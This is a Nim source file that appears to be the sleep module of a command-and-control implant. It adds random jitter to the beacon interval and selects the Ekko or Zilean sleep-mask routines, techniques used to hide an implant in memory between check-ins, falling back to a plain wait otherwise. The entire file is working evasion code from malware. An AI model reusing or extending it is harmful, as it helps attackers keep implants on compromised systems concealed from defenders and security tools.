import ../../utils/global
import ../../utils/winapi/handlers

const pseudoHandle = cast[pointer](-1)

proc sleepTime(ms: culong): culong =
  # Applies jitter to the sleep interval
  if ms == 0: return 0
  if jitter <= 0: return ms
  let spread = (jitter.culong * ms) div 100
  if spread == 0: return ms
  let r = getTickCount() mod spread
  if (getTickCount() and 1) == 0: ms + r else: ms - r

proc beaconMs(seconds = -1): culong =
  # Converts the beacon delay into milliseconds
  if seconds >= 0:
    return seconds.culong * 1000
  if beaconDelay <= 0: 5000.culong else: beaconDelay.culong * 1000

proc sleepBasic(ms: culong) =
  # Sleeps with a plain wait
  if ms == 0: return
  discard waitForSingleObjectEx(pseudoHandle, ms)

when sleepMask in [obf("timer"), obf("ekko")]:
  import ekko
elif sleepMask == obf("zilean"):
  import zilean

proc sleep_now*(seconds = -1; skipSleepMask = false) =
  # Main function that sleeps and applies the mask when possible
  let t = sleepTime(beaconMs(seconds))
  if t == 0:
    return
  when sleepMask in [obf("timer"), obf("ekko"), obf("zilean")]:
    if not skipSleepMask and bgWorkers <= 0:
      when sleepMask == obf("zilean"):
        if zileanObf(t):
          return
      else:
        if ekkoObf(t):
          return
  sleepBasic(t)
